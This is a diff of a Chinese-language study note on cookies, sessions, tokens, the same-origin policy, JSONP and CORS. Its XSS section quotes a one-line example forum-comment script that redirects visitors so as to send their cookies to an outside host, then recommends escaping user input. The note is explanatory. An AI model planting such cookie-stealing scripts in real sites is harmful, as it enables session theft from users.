@@ -1,6 +1,6 @@
-http请求是无状态的，但是我们需要去保持一些状态，于是诞生了cookie头部
+http请求是无状态的，但应用需要维持一些状态
 
-cookie可以是请求头部，也可以是响应头部
+cookie本质是http的header，可以是请求头部，也可以是响应头部，因此限制大小在4k内
 
 # cookie
 通常服务器会给响应报文添加 Set-Cookie:.... 头部，来添加cookie
@@ -9,7 +9,7 @@ cookie可以是请求头部，也可以是响应头部
 
 ```
     type Cookie struct {
-        Name  string //key-val
+        Name  string
         Value string
 
         Path       string    // optional，当请求匹配上该路径时才携带cookie
@@ -37,7 +37,7 @@ cookie可以是请求头部，也可以是响应头部
 
 浏览器通过Cookie头部携带接受的和缓存的cookie发送给服务器
 
-# 第三方cookie
+## 第三方cookie
 假设a、b、c 三个页面植入了 d 公司的广告，你请求这三个页面都会再去请求 d 服务器的一个广告图片
 
 1. 你请求了a页面，解析页面后去请求d服务器的一个图片，d服务器返回给你一个cookie：user="kanggege";page="a";domain="advertisement.com"
@@ -48,7 +48,7 @@ cookie可以是请求头部，也可以是响应头部
 
 甚至追踪你所有的访问记录
 
-# 跨站脚本XSS
+## 跨站脚本XSS
 假设有一个论坛网站，我在下面留言
 
     <script>window.location=http://abc.com?cookie=docuemnt.cookie</script>
@@ -62,14 +62,14 @@ cookie可以是请求头部，也可以是响应头部
 最好还是要将从用户得到的信息在存入数据库之前进行转义，这样更安全
 
 # session
-通过客户端的cookieid可以在服务器上维护一个唯一的session，对应这个用户
+通过客户端的cookie中携带的sessionid可以在服务器上维护一个对应的session
 
-所谓session就是一个数据结构，类似于map\[key]data，cookie就是key，通过key得到data，这个data可以存入任何数据或取出已经存入的数据
+session一般是类似 map\[key]data 的数据结构，
 
 所以可以通过session维护用户的登录操作，具体实现如下：
 
-1. 接受到一个请求，获取请求中request的cookie值，如果能获取到cookieid，则用户已经登录，通过cookieid获取session，从session中获取用户身份信息，否则用户未登录
-2. 跳转用户登录，验证账号密码，response中设置cookieid，为cookieid创建session，将session中存入一个数据(例如：userid)保存用户登录状态
+1. 接受到一个请求，获取请求中request的cookie值，如果检查有sessionid且值存在服务器，则用户已经登录，通过sessionid获取session，从session中获取用户身份信息，否则用户未登录
+2. 跳转用户登录，验证账号密码，response中设置cookie：sessionid=xxxxx，在服务器创建session，将session中存入一个数据(例如：userid)保存用户身份信息
 
 ## 单机
 这种登录方式很简单，但是局限于单机应用，如果几十万的用户登录，一个服务器维护几十万session，就很吃力了，如果采用多个机器负载均衡，就要两个机器间同步session，否则第二次请求发到没有session的机器上，就要重新登录，局限太多
@@ -103,3 +103,87 @@ cookie可以是请求头部，也可以是响应头部
 2. 服务器验证，正确后查找uid，token=单向加密算法(登录状态 + 秘钥)，将登录状态+token返回给客户端
 3. 用户访问该域名(或还能指定其他域名)时自动携带
 4. 服务器验证token是否正确，判断登录状态
+
+
+# 同源策略
+如果两个页面的**协议、端口和域名**都相同，则两个页面具有相同的源(注：http和https属于不同协议)
+
+同源政策起初目的是为了保护cookie，A网站设置的cookie，B网站不能打开，防止cookie被恶意窃取
+
+随着互联网发展，同源越来越严格，目前如果非同源将有三种行为受限制
+
+1. Cookie、LocalStorage、IndexDB无法读取
+2. DOM无法获取
+3. ajax请求不能发送
+
+前两个限制是有必要的，但是ajax的限制会给开发带来很多不便
+
+## cookie
+两个网页一级域名相同，二级域名不同，浏览器允许通过document.domain共享cookie
+
+A：http://nb.kanggege.com/a.html、B:http://nba.kanggege.com/b.html，那么只要设置相同的document.domain，两个网页可以共享cookie
+
+服务器在设置cookie时也可以指定一级域名，Seet-Cookie：key=val; domain=.kanggege.com; path=/ 
+
+这样二级三级域名不用做任何设置，都能读取这个cookie
+
+## ajax
+同源政策规定，ajax只能发给同源的网址，否则就报错，有三个方法避免这个限制
+
+
+# jsonp
+script标签可以发送给任意的网站，不受同源影响，就有大神搞出了jsonp
+
+```
+function addScriptTag(src){
+    var script = document.createElement('script')
+    script.setAttribute('type','text/javascript')
+    script.src = src
+    document.body.appendChild(script)
+}
+
+addScriptTag('http://kanggege.com/api?callback=task')
+
+function task(data){
+    console.log(data) //后台会将数据放到data中，这里定义请求到数据的回调函数
+}
+
+```
+
+服务器接收到请求后，返回一段js脚本，就是一个函数调用，task({backdata:data})
+
+jsonp作为绕过跨域限制的小手段可以兼容所有浏览器，但是只能发出get请求，就一定会受到get请求url长度的限制
+
+# CORS
+既然跨域请求存在，就需要浏览器去解决他，针对不同类型的ajax跨域请求，浏览器会自动执行CORS通信，这个通信过程由浏览器自动执行，会在头部添加一些信息，有时还会多出一次附加请求，但用户无需编写额外代码也感知不到
+
+## 简单请求
+1. HEAD、GET、POST 三种请求之一
+2. HTTP头部信息不超出以下字段
+    1. accept、accept-language、content-language、last-event-id、content-type: application/x-www-form-urlencoded、multipart/form-data、text/plain
+
+对于简单请求，浏览器会在发送的时候添加 Origin 字段，Origin: http://api.kangege.com 说明来自哪个源(协议+域名+端口)。服务器会根据这个字段决定是否同一这个请求
+
+如果Origin在允许范围内，服务器返回的信息会多出几个头部字段
+
+    Access-Control-Allow-Origin:*
+    Access-Control-Allow-Credentials: true
+    Access-Control-Expose-Headers: FooBar
+    Content-Type: text/html; charset=utf-8
+
+1. Access-Control-Allow-Origin，这个字段是必须的，值代表了可以接收请求的域名，如果是 * 代表接收任意域名请求
+2. Access-Control-Allow-Credentials，可选值，表示是否允许发送cookie，默认是不可发送
+3. 该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。
+
+如果Origin指定的源不在服务器设定允许范围内，就返回一个正常的HTTP请求，浏览器发现返回头信息没有Access-Control-Allow-Origin字段，就知道出错了，抛出一个错误
+
+上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。另一方面，开发者必须在AJAX请求中打开withCredentials属性。
+
+## 非简单请求
+对服务器有特殊要求的请求，比如请求方法是 PUT、DELETE，或者 Content-Type:application/json
+
+非简单请求浏览器会先发起一个options请求做预检，询问服务器支持的域名、请求方法、请求头，如果ajax请求不满足服务器配置，则报错，满足再发送ajax请求
+
+服务器预检完后，除了回复上面简单请求的字段，还会回复Access-Control-Max-Age，表示该预检有效事件，避免每次ajax都需要预检
+
+CORS比JSONP更麻烦，但更强大，JSONP的优势在于支持老旧浏览器
